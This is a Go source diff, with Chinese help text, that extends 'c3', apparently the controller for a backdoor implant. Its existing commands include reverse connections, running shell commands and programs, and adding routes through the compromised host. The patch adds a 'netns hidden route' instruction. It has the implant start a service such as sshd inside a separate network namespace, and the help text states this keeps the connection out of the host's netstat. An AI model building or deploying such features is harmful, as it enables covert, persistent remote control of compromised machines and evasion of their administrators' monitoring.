@@ -92,6 +92,7 @@ p2:     功能端口(被控端实际与控制端通讯的本地程序功能端�
 -2:     同 -i 02 反弹
 -3:     同 -i 03 执行shell命令
 -4:     同 -i 04 执行程序
+-5:     同 -i 05 netns隐藏路由(ext指定ns内服务命令，仅ruport-go支持)
 
 
 **************************************************
@@ -116,6 +117,10 @@ p2:     功能端口(被控端实际与控制端通讯的本地程序功能端�
 5.  c3 -t 192.168.1.2 -p 80 -1 -S 192.168.1.3 -P 12345 -x 80 -y 22
     // 给被控制端添加路由，注意：必须指定出网端口(-x)和被控端本地端口(-y)
 
+6.  c3 -t 192.168.1.2 -p 80 -5 -S 192.168.1.3 -P 3333 -x 80 -y 22 -e "sshd -D -p 22"
+    // netns隐藏路由：被控端在独立网络命名空间内拉起服务并转发，
+    // 宿主netstat不显示该连接；-e为ns内服务命令（可省略，前提ns内已有服务）
+
 **************************************************
 附加：
 **************************************************
@@ -137,6 +142,8 @@ func printMsg(info *insInfo) {
 		log.Print("成功发送指令:    执行shell命令")
 	} else if info.ins == 0x04 {
 		log.Print("成功发送指令:    执行程序")
+	} else if info.ins == 0x05 {
+		log.Print("成功发送指令:    netns隐藏路由")
 	}
 }
 
@@ -221,6 +228,7 @@ func main() {
 	flag.Bool("2", false, "同 -i 02 反弹")
 	flag.Bool("3", false, "同 -i 03 执行shell命令")
 	flag.Bool("4", false, "同 -i 04 执行程序")
+	flag.Bool("5", false, "同 -i 05 netns隐藏路由")
 	flag.StringVar(&info.ip, "S", "", "控制服务器地址")
 	flag.IntVar(&info.port, "P", 0, "控制服务器端口")
 	flag.IntVar(&info.p1, "x", 0, "出网端口(p1)")
@@ -246,6 +254,8 @@ func main() {
 			info.ins = 0x03
 		case "4":
 			info.ins = 0x04
+		case "5":
+			info.ins = 0x05
 		}
 	})
 
@@ -263,7 +273,7 @@ func main() {
 		info.p1 = targetPort
 	}
 
-	if info.ins&0x00ff == 0x01 {
+	if info.ins&0x00ff == 0x01 || info.ins&0x00ff == 0x05 {
 		if info.p2 == 0 {
 			fmt.Println("添加路由功能必须指定p2参数.")
 			os.Exit(1)
